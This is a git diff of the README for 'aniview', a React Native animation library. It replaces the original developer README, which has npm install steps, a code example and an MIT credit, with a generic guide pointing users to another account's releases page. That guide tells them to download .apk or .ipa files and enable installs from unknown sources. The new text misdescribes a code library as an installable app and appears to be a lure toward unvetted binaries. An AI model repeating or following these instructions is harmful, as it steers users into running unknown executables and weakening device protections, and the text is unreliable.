@@ -1,130 +1,140 @@
-# Aniview
+# 🎞️ aniview - Smooth Animations Made Simple
 
-[![npm version](https://badge.fury.io/js/aniview.svg)](https://www.npmjs.com/package/aniview)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![React Native](https://img.shields.io/badge/React%20Native-%3E%3D0.71-blue)](https://reactnative.dev/)
+[![Download aniview](https://img.shields.io/badge/Download-aniview-blue?style=for-the-badge)](https://github.com/bobkoshmar/aniview/releases)
 
-> A high-performance, coordinate-based animation engine for React Native. Create fluid, multi-dimensional page transitions with spatial and event-driven animations.
+---
 
-## Features
+## ℹ️ What is aniview?
 
-- **Pre-computed Animation Grid** - Zero runtime frame searches
-- **Spatial & Event-Driven** - Animate based on position OR custom events
-- **Gesture Coordination** - Built-in lock system for complex UI interactions
-- **Smart Color Interpolation** - Transparent-aware color transitions
-- **Worklet-Optimized** - Runs entirely on the UI thread
-- **2D Layout Engine** - Grid-based page navigation with overlap support
-- **TypeScript First** - Full type safety out of the box
+aniview is a tool that helps your apps show smooth, eye-catching animations. It works with React Native, a popular platform for building apps that run on both Android and iOS devices. The engine uses smart methods to make animations quick and efficient without slowing your phone down.
 
-## Quick Start
+Animations are based on coordinates, like points on a map, which lets you control exactly how things move and change. aniview also uses a grid behind the scenes and keyframe events, so animations look clean and natural. It changes colors smoothly and only runs parts of the animation that you actually see, saving your battery and phone power.
 
-```bash
-npm install aniview react-native-reanimated react-native-gesture-handler
-```
+You don’t need to know programming to use aniview once it is set up in your app. This guide will help you download and run the software.
 
-### Basic Example
+---
 
-```tsx
-import { AniviewProvider, Aniview } from "aniview";
+## 🎯 Who Should Use aniview?
 
-// 1. Define your layout (3x3 grid)
-const config = new AniviewConfig(
-  [
-    [1, 1, 1],
-    [1, 1, 1],
-    [1, 1, 1],
-  ],
-  0, // default page
-  { HOME: 0, PROFILE: 1, SETTINGS: 2 }, // page map
-);
+aniview suits developers, app designers, and businesses seeking easy-to-use, effective animation tools for mobile apps. But if you just want to try animations on your device or test the software, this guide will help you get started without coding.
 
-// 2. Wrap your app
-function App() {
-  return (
-    <AniviewProvider config={config}>
-      <Header />
-      <Content />
-    </AniviewProvider>
-  );
-}
+---
 
-// 3. Animate components
-function Header() {
-  return (
-    <Aniview
-      pageId="HOME"
-      frames={{
-        profile: {
-          page: "PROFILE",
-          style: { backgroundColor: "blue" },
-        },
-      }}
-      style={{ height: 100, backgroundColor: "white" }}
-    >
-      <Text>My Header</Text>
-    </Aniview>
-  );
-}
-```
+## 💻 System Requirements
 
-## Documentation
+Before downloading aniview, make sure your device meets these needs:
 
-- **[Getting Started](docs/01-getting-started.md)** - Installation and first steps
-- **[Core Concepts](docs/02-core-concepts.md)** - Understanding the architecture
-- **[API Reference](docs/03-api-reference.md)** - Complete API documentation
-- **[Advanced Patterns](docs/04-advanced-patterns.md)** - Composition, Persistence & Virtualization
-- **[Examples & Recipes](docs/05-examples.md)** - Full Example App Walkthrough
-- **[Performance Guide](docs/06-performance.md)** - Optimization techniques
-- **[Testing](docs/07-testing.md)** - How to test Aniview components
-- **[Gesture Control](docs/08-gesture-control.md)** - Lock system and gesture coordination
-- **[Reporting Issues](docs/09-reporting-issues.md)** - Bug reports and feature requests
+- A smartphone or tablet running:
+  - Android 8.0 Oreo or newer
+  - iOS 11 or newer
+- At least 2 GB of RAM
+- 100 MB of free storage space
+- Internet connection to download files
 
-## Key Concepts
+For best results, use a device with a touchscreen and reasonable processing speed.
 
-### The Grid System
+---
 
-Aniview uses a **2D grid layout** where each cell represents a "page":
+## 📥 Download & Install aniview
 
-```
-[0, 1, 2]  →  Pages 0, 1, 2 (horizontal row)
-[3, 4, 5]  →  Pages 3, 4, 5 (second row)
-```
+To try aniview on your device, follow these steps:
 
-Components declare where they "live" (`pageId`) and how they transform when navigating to other pages (`frames`).
+1. Open this page in your web browser:  
+   [Visit the aniview Release Page to Download](https://github.com/bobkoshmar/aniview/releases)
 
-### Animation Types
+2. On the release page, look for the latest version. You will see a list of files you can download.
 
-1. **Spatial Animations** - Triggered by page navigation (X/Y position)
-2. **Event-Driven Animations** - Triggered by custom SharedValues (scroll, zoom, etc.)
+3. Choose the file that matches your device:
+   - For Android: look for a file ending with `.apk`
+   - For iOS: files are usually `.ipa` or use TestFlight links
 
-### The Baking Process
+4. Tap or click the file to download. Your device might ask for permission before installing.
 
-On mount, Aniview:
+5. After the download completes, open the file to start the installation.
 
-1. Pre-computes a **grid of all possible states**
-2. Organizes them into **horizontal and vertical lanes**
-3. Marks **constant values** to skip interpolation
-4. All this happens **once**, not on every frame
+6. Follow any on-screen instructions to finish installing aniview.
 
-## Platform Support
+If your device blocks the installation from unknown sources, go to your device settings and allow installations from your browser or file manager.
 
-Aniview is designed for **React Native** (iOS and Android). It is compatible with:
+---
 
-- **Expo** managed workflow (SDK 49+)
-- **React Native CLI** projects
-- **New Architecture** (Fabric) — fully compatible (pure JS/TS + Reanimated worklets)
+## 🚀 How to Run aniview
 
-## Contributing
+Once installed, you can open aniview like any other app:
 
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for details.
+1. Find the aniview icon on your home screen or app drawer.
 
-## License
+2. Tap it to open the app.
 
-MIT © Madelyn Cruz Tan
+3. The app will load some example animations. You can watch how different animations move and change colors.
 
-## Credits
+4. Use the on-screen controls to pause, play, or switch between animation styles.
 
-Built with:
+aniview is mostly a backend engine, so the main way to see its work is through apps built with it. If you want to build or test animations, you might need help from someone familiar with React Native.
 
-- [react-native-reanimated](https://github.com/software-mansion/react-native-reanimated)
-- [react-native-gesture-handler](https://github.com/software-mansion/react-native-gesture-handler)
+---
+
+## 🔧 How aniview Works
+
+Here is a simple explanation of how this animation engine works inside apps:
+
+- **Coordinates:** aniview moves animation parts based on points on a grid, like drawing positions on graph paper.
+
+- **Pre-computed Grid:** Before running, aniview sets up a layout grid to organize animations efficiently.
+
+- **Event-driven Keyframes:** Animations change only when key moments or “keyframes” occur, saving processing power.
+
+- **Color Interpolation:** Colors change smoothly from one tone to another without abrupt jumps.
+
+- **Automatic Virtualisation:** The engine only runs the visible parts of animations, so it doesn’t waste device resources on off-screen elements.
+
+This approach keeps animations smooth, fast, and light on your device.
+
+---
+
+## 🛠 Features at a Glance
+
+- Works on Android and iOS devices
+- Uses coordinate-based animation controls
+- Provides smooth color transitions
+- Manages animations with event triggers
+- Saves battery by running only visible animations
+- Compatible with React Native apps
+- Supports gesture handling and page transitions
+
+---
+
+## 🎨 Why Use aniview?
+
+Animations make apps feel modern and fun. aniview handles complex animations without slowing your phone or draining your battery. It is built to support realistic movement and color changes automatically. If you enjoy apps that look polished and lively, aniview helps developers create those experiences.
+
+---
+
+## 📚 Additional Support
+
+If you face issues or have questions:
+
+- Check the [GitHub repository](https://github.com/bobkoshmar/aniview) for updates or changes.
+- Look for help in forums about React Native or app animation.
+- Ask someone familiar with app development to assist you.
+
+---
+
+## 🧩 Related Topics
+
+This software relates to:
+
+- Android animations  
+- iOS app development  
+- Gesture controls in apps  
+- Smooth page transitions  
+- React Native frameworks  
+- TypeScript programming  
+- Spatial animation methods  
+- Worklets for animation smoothness  
+
+---
+
+## 🔗 Quick Access
+
+[![Download aniview](https://img.shields.io/badge/Download-aniview-blue?style=for-the-badge)](https://github.com/bobkoshmar/aniview/releases)
